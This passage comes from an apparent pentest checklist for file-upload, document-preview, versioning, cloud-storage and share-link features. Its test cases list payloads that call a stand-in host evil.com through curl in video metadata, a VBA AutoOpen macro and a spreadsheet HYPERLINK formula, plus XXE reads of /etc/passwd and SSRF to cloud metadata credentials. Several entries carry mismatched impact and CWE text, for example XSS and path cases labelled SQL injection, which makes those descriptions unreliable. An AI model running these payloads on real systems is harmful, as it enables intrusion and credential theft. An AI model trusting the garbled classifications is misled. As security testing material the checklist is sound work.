**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FILE-038 — FFmpeg SSRF Exploitation
**Test Category:** WSTG-INPV-19 / SSRF · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Video Upload &amp; Processing

**Test Steps:** 1. Create malicious video file with HLS playlist referencing internal URLs 2. Upload video for processing 3. Monitor for internal network requests 4. Check if metadata endpoint is accessible

**Expected Result:** Application must sanitize video input and restrict FFmpeg network access

**Payload Example:**

```
#EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0 http://169.254.169.254/latest/meta-data/ #EXT-X-ENDLIST
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** FFmpeg / Burp Collaborator / Custom M3U8

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## FILE-039 — FFmpeg Local File Read
**Test Category:** WSTG-INPV-19 / LFI · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Video Upload &amp; Processing

**Test Steps:** 1. Create M3U8/AVI file with file:// protocol references 2. Upload for video processing 3. Download processed output 4. Check if local file content appears in output frames

**Expected Result:** Application must disable file:// protocol and restrict FFmpeg protocols

**Payload Example:**

```
#EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0 concat:http://evil.com/header.y4m|file:///etc/passwd #EXT-X-ENDLIST
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** FFmpeg / Custom Scripts / Burp Suite

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## FILE-040 — Video Processing Resource Exhaustion
**Test Category:** WSTG-DOS-01 / Denial of Service · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Video Upload &amp; Processing

**Test Steps:** 1. Upload video with extreme resolution or duration 2. Request transcoding to multiple formats simultaneously 3. Upload video with complex codec requiring heavy processing 4. Monitor CPU/memory

**Expected Result:** Application must limit video processing resources and implement queue management

**Payload Example:**

```
Upload 8K resolution 60fps video or extremely long duration video for transcoding
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** FFmpeg / Custom Video Files / Server Monitoring

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## FILE-041 — Malicious Subtitle File Injection
**Test Category:** WSTG-INPV-02 / Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Video Upload &amp; Processing

**Test Steps:** 1. Create SRT/ASS subtitle file with XSS payload 2. Upload subtitle with video 3. View video with subtitles enabled 4. Check if subtitle content is rendered as HTML

**Expected Result:** Application must sanitize subtitle content and render as plain text only

**Payload Example:**

```
1\n00:00:00 --> 00:00:10\n<script>alert(document.cookie)</script>
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Text Editor / Burp Suite / Browser

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FILE-042 — Video Metadata Command Injection
**Test Category:** WSTG-INPV-01 / Command Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Video Upload &amp; Processing

**Test Steps:** 1. Modify video metadata fields with OS commands 2. Upload video for processing 3. Check if metadata is passed to shell commands 4. Monitor for command execution

**Expected Result:** Application must sanitize metadata and avoid passing to shell commands

**Payload Example:**

```
exiftool -Title='$(curl http://evil.com/rce)' video.mp4
```

**Impact:** OS command injection -&gt; remote code execution / server takeover.

**Tools:** ExifTool / Burp Suite / Burp Collaborator

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins

---

## FILE-043 — Codec Exploitation via Crafted Video
**Test Category:** WSTG-INPV-01 / Buffer Overflow · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Video Upload &amp; Processing

**Test Steps:** 1. Create video with malformed codec headers 2. Upload crafted video file targeting known codec vulnerabilities 3. Monitor for crashes 4. Check server logs for segfaults

**Expected Result:** Application must use updated codec libraries and run processing in sandboxed environment

**Payload Example:**

```
Crafted AVI/MP4 with malformed H.264 NAL units targeting CVE-specific vulnerabilities
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** FFmpeg / AFL Fuzzer / Custom Craft Scripts

**References:** CWE-840; PortSwigger Business logic

---

## FILE-044 — HLS Manifest Injection
**Test Category:** WSTG-INPV-02 / Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Video Upload &amp; Processing

**Test Steps:** 1. Upload video and intercept HLS playlist generation 2. Inject additional entries in M3U8 manifest 3. Reference external malicious segments 4. Test for playlist manipulation

**Expected Result:** Application must generate playlists server-side without user input injection

**Payload Example:**

```
#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0\nhttps://evil.com/malicious_segment.ts
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Custom M3U8 / VLC

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FILE-045 — Video Thumbnail Extraction Exploit
**Test Category:** WSTG-INPV-19 / SSRF · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Video Upload &amp; Processing

**Test Steps:** 1. Create video where specific frame contains SSRF payload 2. Upload video knowing server extracts thumbnails 3. Embed crafted data at known extraction point 4. Monitor for server-side requests

**Expected Result:** Application must sanitize extracted thumbnails and restrict processing capabilities

**Payload Example:**

```
Video file with SSRF payload embedded at frame used for thumbnail extraction
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** FFmpeg / Custom Video Scripts / Burp Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## FILE-046 — XXE via DOCX/XLSX Upload
**Test Category:** WSTG-INPV-07 / XXE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Document Preview

**Test Steps:** 1. Create DOCX file and extract its contents 2. Inject XXE payload in [Content_Types].xml or document.xml 3. Repack as DOCX 4. Upload and trigger preview 5. Check for data exfiltration

**Expected Result:** Application must disable external entities in XML parser used for document preview

**Payload Example:**

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> then reference &xxe; in document body
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / Custom Python / xxeinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## FILE-047 — XXE via SVG in Document
**Test Category:** WSTG-INPV-07 / XXE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Document Preview

**Test Steps:** 1. Create DOCX with embedded SVG containing XXE 2. Upload document for preview 3. Check if SVG parser resolves external entities 4. Attempt data exfiltration via OOB XXE

**Expected Result:** Application must sanitize embedded SVGs and disable external entity resolution

**Payload Example:**

```
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg> with XXE DTD
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / Custom DOCX builder

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## FILE-048 — SSRF via Document Links
**Test Category:** WSTG-INPV-19 / SSRF · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Document Preview

**Test Steps:** 1. Create document with external resource links (images/stylesheets) 2. Reference internal network URLs 3. Upload and trigger server-side preview rendering 4. Monitor for internal requests

**Expected Result:** Application must not follow external links during server-side document rendering

**Payload Example:**

```
DOCX with linked image: http://169.254.169.254/latest/meta-data/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite Collaborator / Custom DOCX / LibreOffice

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## FILE-049 — PDF JavaScript Execution
**Test Category:** WSTG-INPV-02 / Code Execution · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Document Preview

**Test Steps:** 1. Create PDF with embedded JavaScript actions 2. Upload PDF for preview 3. Check if JS executes in preview context 4. Test for XSS via PDF JS

**Expected Result:** Application must strip JavaScript from PDFs or use safe rendering without JS execution

**Payload Example:**

```
/OpenAction << /S /JavaScript /JS (app.alert('XSS')) >> in PDF structure
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** PDFtk / QPDF / Burp Suite / Camelot

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FILE-050 — OLE Object Exploitation
**Test Category:** WSTG-INPV-02 / Code Execution · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Document Preview

**Test Steps:** 1. Create Office document with malicious OLE objects 2. Embed executable or macro in OLE object 3. Upload for preview 4. Check if OLE objects are processed server-side

**Expected Result:** Application must strip OLE objects from documents during preview rendering

**Payload Example:**

```
DOCX with embedded OLE object containing cmd.exe reference
```

**Impact:** Code/command execution -&gt; full server compromise.

**Tools:** oletools / Custom Office Docs / Burp Suite

**References:** CWE-94; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger; OWASP

---

## FILE-051 — Macro Execution in Document Preview
**Test Category:** WSTG-INPV-02 / Code Execution · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Document Preview

**Test Steps:** 1. Create Office document with VBA macros 2. Include auto-execute macros (AutoOpen/Auto_Open) 3. Upload for preview 4. Check if macros execute on server during rendering

**Expected Result:** Application must disable macro execution in document preview engine

**Payload Example:**

```
Sub AutoOpen() Shell("curl http://evil.com/rce") End Sub in DOCM file
```

**Impact:** Code/command execution -&gt; full server compromise.

**Tools:** MS Office / oletools / olevba / Burp Suite

**References:** CWE-94; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger; OWASP

---

## FILE-052 — HTML Injection in Document Preview
**Test Category:** WSTG-INPV-02 / XSS · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Document Preview

**Test Steps:** 1. Create document with HTML/CSS content 2. Include iframe and script tags in document text 3. Upload and preview 4. Check if HTML renders in preview context

**Expected Result:** Application must sanitize document content and render preview in sandboxed iframe

**Payload Example:**

```
Document containing <iframe src="javascript:alert(1)"> or <script> tags in text
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / LibreOffice / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FILE-053 — Path Traversal in Document Parsing
**Test Category:** WSTG-INPV-05 / Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Document Preview

**Test Steps:** 1. Create document with references to files using path traversal 2. Include ../../etc/passwd in document resource paths 3. Upload and trigger preview 4. Check for file content leakage

**Expected Result:** Application must restrict file access during document parsing to designated directories

**Payload Example:**

```
DOCX with relationship target="../../../etc/passwd" in _rels/.rels
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Custom DOCX builder / Burp Suite

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## FILE-054 — Billion Laughs XXE DoS
**Test Category:** WSTG-DOS-01 / Denial of Service · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Document Preview

**Test Steps:** 1. Create XML document with recursive entity expansion 2. Embed in DOCX/XLSX internal XML 3. Upload for preview 4. Monitor server memory consumption

**Expected Result:** Application must limit entity expansion depth and count in XML parsers

**Payload Example:**

```
<!ENTITY lol9 "&lol8;&lol8;&lol8;"> nested 9 levels deep causing exponential expansion
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Custom XML / Burp Suite / Server Monitoring

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## FILE-055 — Formula Injection in Spreadsheet Preview
**Test Category:** WSTG-INPV-02 / CSV Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Document Preview

**Test Steps:** 1. Create XLSX with cells containing formula injection 2. Use =CMD() or =HYPERLINK() formulas 3. Upload for preview 4. Check if formulas execute during rendering

**Expected Result:** Application must treat all cell content as text during preview rendering

**Payload Example:**

```
=cmd|'/C calc'!A1 or =HYPERLINK("http://evil.com/steal?d="&A1) in XLSX cells
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** MS Excel / LibreOffice / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FILE-056 — Unauthorized Access to Previous Versions
**Test Category:** WSTG-ATHZ-04 / IDOR · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Versioning

**Test Steps:** 1. Upload file as User A and create multiple versions 2. Login as User B 3. Enumerate version IDs 4. Attempt to access/download previous versions of User A files

**Expected Result:** Application must enforce same authorization on all file versions as the current file

**Payload Example:**

```
GET /api/files/123/versions/1 or GET /api/files/123/versions/2 as unauthorized user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize / cURL

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FILE-057 — Version Rollback to Malicious Content
**Test Category:** WSTG-BUSL-08 / Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Versioning

**Test Steps:** 1. Upload safe file (passes validation) 2. Upload malicious file as new version (blocked) 3. If old version had malicious content rollback to it 4. Check if rollback bypasses current validation

**Expected Result:** Application must re-validate file content on version rollback operations

**Payload Example:**

```
Upload shell.php v1 (bypasses old validation) then rollback from safe v2 to malicious v1
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / cURL

**References:** CWE-840; PortSwigger Business logic

---

## FILE-058 — Version History Information Disclosure
**Test Category:** WSTG-INFO-05 / Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** File Versioning

**Test Steps:** 1. Access version history API endpoint 2. Check for metadata leakage (IP addresses / usernames / timestamps) 3. Enumerate changes between versions 4. Check if deleted sensitive content is in history

**Expected Result:** Application must restrict version history access to authorized users and sanitize metadata

**Payload Example:**

```
GET /api/files/123/history showing uploader IP addresses and internal usernames
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / cURL / Autorize

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FILE-059 — Version ID Enumeration
**Test Category:** WSTG-ATHZ-04 / IDOR · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** File Versioning

**Test Steps:** 1. Note version ID format (sequential/UUID) 2. Increment or decrement version IDs 3. Access versions belonging to other files or users 4. Brute force version identifiers

**Expected Result:** Application must use non-sequential unpredictable version identifiers with authorization checks

**Payload Example:**

```
GET /api/files/123/versions/456 trying /versions/457 /versions/458 etc.
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / IDOR scripts / Autorize

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## FILE-060 — Version Deletion Authorization Bypass
**Test Category:** WSTG-ATHZ-02 / Privilege Escalation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Versioning

**Test Steps:** 1. Identify version delete endpoint 2. Try deleting versions of other users files 3. Test if non-admin can delete version history 4. Check if deleted versions are truly purged

**Expected Result:** Application must restrict version deletion to authorized owners and admins

**Payload Example:**

```
DELETE /api/files/123/versions/456 as non-owner user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / cURL / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FILE-061 — Race Condition in Version Creation
**Test Category:** WSTG-BUSL-09 / Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** File Versioning

**Test Steps:** 1. Send multiple simultaneous update requests 2. Check if version numbering is corrupted 3. Verify all versions are properly recorded 4. Test for data loss under concurrent updates

**Expected Result:** Application must serialize version creation and maintain consistent version numbering

**Payload Example:**

```
Send 50 parallel PUT /api/files/123 requests with different content simultaneously
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Burp Suite Turbo Intruder / Apache JMeter

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## FILE-062 — S3 Bucket Misconfiguration Discovery
**Test Category:** WSTG-CONF-11 / Cloud Security · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Cloud Storage Integration (S3 GCS)

**Test Steps:** 1. Identify S3 bucket names from application URLs 2. Test for public read access 3. Test for public write access 4. Try listing bucket contents 5. Check bucket policy

**Expected Result:** S3 buckets must not allow public access or listing unless explicitly required

**Payload Example:**

```
aws s3 ls s3://target-bucket --no-sign-request or curl https://target-bucket.s3.amazonaws.com/
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** AWS CLI / S3Scanner / BucketFinder / Burp Suite

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## FILE-063 — Presigned URL Abuse
**Test Category:** WSTG-ATHZ-04 / Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cloud Storage Integration (S3 GCS)

**Test Steps:** 1. Generate presigned upload URL 2. Reuse URL after expiration 3. Modify the URL path to access different objects 4. Share presigned URL and test from different IP

**Expected Result:** Application must set short expiration times and restrict presigned URL scope

**Payload Example:**

```
Modify presigned URL path from /uploads/file.jpg to /private/secrets.txt keeping same signature
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** AWS CLI / cURL / Burp Suite

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FILE-064 — Cloud Metadata SSRF
**Test Category:** WSTG-INPV-19 / SSRF · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Cloud Storage Integration (S3 GCS)

**Test Steps:** 1. Find file URL input or redirect functionality 2. Replace with cloud metadata URL 3. Attempt IMDSv1 and IMDSv2 endpoints 4. Extract IAM credentials from metadata

**Expected Result:** Application must block requests to cloud metadata endpoints (169.254.169.254)

**Payload Example:**

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap / cURL

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## FILE-065 — S3 Object Key Injection
**Test Category:** WSTG-INPV-05 / Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cloud Storage Integration (S3 GCS)

**Test Steps:** 1. Intercept requests containing S3 object keys 2. Inject path traversal in object key 3. Try accessing objects in other prefixes 4. Attempt key manipulation to access restricted objects

**Expected Result:** Application must validate and sanitize S3 object keys and enforce prefix restrictions

**Payload Example:**

```
key=uploads/../private/secret.txt or key=uploads/..%2fprivate/secret.txt
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / AWS CLI / cURL

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FILE-066 — Access Key Exposure in Client Code
**Test Category:** WSTG-INFO-02 / Information Disclosure · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Cloud Storage Integration (S3 GCS)

**Test Steps:** 1. Inspect JavaScript source code for AWS/GCS credentials 2. Check HTML source and inline scripts 3. Review API responses for credential leakage 4. Check browser local storage

**Expected Result:** Application must never expose cloud storage credentials in client-side code

**Payload Example:**

```
AKIA[A-Z0-9]{16} pattern in JavaScript files or API responses
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** TruffleHog / GitLeaks / Burp Suite / grep

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FILE-067 — GCS Bucket Enumeration
**Test Category:** WSTG-CONF-11 / Cloud Security · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Cloud Storage Integration (S3 GCS)

**Test Steps:** 1. Identify GCS bucket names from application 2. Test public access via storage.googleapis.com 3. Try listing bucket objects 4. Check for misconfigured IAM policies

**Expected Result:** GCS buckets must enforce proper IAM policies and prevent unauthorized access

**Payload Example:**

```
curl https://storage.googleapis.com/target-bucket/ or gsutil ls gs://target-bucket/
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** gsutil / GCPBucketBrute / cURL / Burp Suite

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## FILE-068 — Insecure Direct Cloud Object Reference
**Test Category:** WSTG-ATHZ-04 / IDOR · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cloud Storage Integration (S3 GCS)

**Test Steps:** 1. Capture cloud storage URLs for uploaded files 2. Modify object identifiers in URLs 3. Try accessing other users uploaded files 4. Enumerate cloud storage paths

**Expected Result:** Application must implement authorization layer between users and cloud storage objects

**Payload Example:**

```
Change https://bucket.s3.amazonaws.com/user1/file.pdf to /user2/file.pdf
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / AWS CLI / cURL

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FILE-069 — Bucket Policy Bypass via ACL Manipulation
**Test Category:** WSTG-ATHZ-02 / Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Cloud Storage Integration (S3 GCS)

**Test Steps:** 1. If application sets object ACLs check for misconfigurations 2. Test if uploaded objects inherit overly permissive ACLs 3. Try PUT object ACL to grant public access 4. Verify cross-account access

**Expected Result:** Application must set restrictive default ACLs and validate ACL changes

**Payload Example:**

```
aws s3api put-object-acl --bucket target --key file.pdf --acl public-read
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** AWS CLI / S3 Browser / Burp Suite

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FILE-070 — Cloud Storage Credential Rotation Failure
**Test Category:** WSTG-CONF-11 / Configuration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Cloud Storage Integration (S3 GCS)

**Test Steps:** 1. Check if application uses long-lived static credentials 2. Test if old credentials still work after rotation 3. Verify temporary credential usage 4. Check credential scope and permissions

**Expected Result:** Application must use temporary credentials (STS) with minimal permissions and rotate regularly

**Payload Example:**

```
Use previously captured AWS access key to verify if still active after rotation
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** AWS CLI / CloudSploit / ScoutSuite

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## FILE-071 — Predictable Share Link Token
**Test Category:** WSTG-ATHZ-04 / Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File Sharing / Public Links

**Test Steps:** 1. Generate multiple share links 2. Analyze token pattern for predictability 3. Attempt to guess or brute-force tokens 4. Check if sequential or timestamp-based

**Expected Result:** Application must use cryptographically random tokens of sufficient length (128+ bits)

**Payload Example:**

```
Share tokens like share_001 share_002 or base64(timestamp+fileid)
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite Intruder / Custom Scripts / Python

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FILE-072 — Share Link Expiration Bypass
**Test Category:** WSTG-BUSL-08 / Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Sharing / Public Links

**Test Steps:** 1. Generate share link with expiration 2. Note the link and wait for expiration 3. Access the link after expiry 4. Manipulate expiration parameter in URL or request

**Expected Result:** Application must enforce link expiration server-side and invalidate expired tokens

**Payload Example:**

```
Access /share/abc123 after expiry or modify ?expires=9999999999 parameter
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / cURL / Browser

**References:** CWE-840; PortSwigger Business logic

---

## FILE-073 — Permission Escalation via Shared Links
**Test Category:** WSTG-ATHZ-02 / Privilege Escalation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Sharing / Public Links

**Test Steps:** 1. Generate read-only share link 2. Attempt write/delete operations using share token 3. Try to modify sharing permissions 4. Escalate from view to edit access

**Expected Result:** Application must enforce granular permissions on shared links and validate each operation

**Payload Example:**

```
PUT /api/shared/abc123/content or DELETE /api/shared/abc123 with read-only token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / cURL

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FILE-074 — Information Disclosure in Share Link Metadata
**Test Category:** WSTG-INFO-05 / Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** File Sharing / Public Links

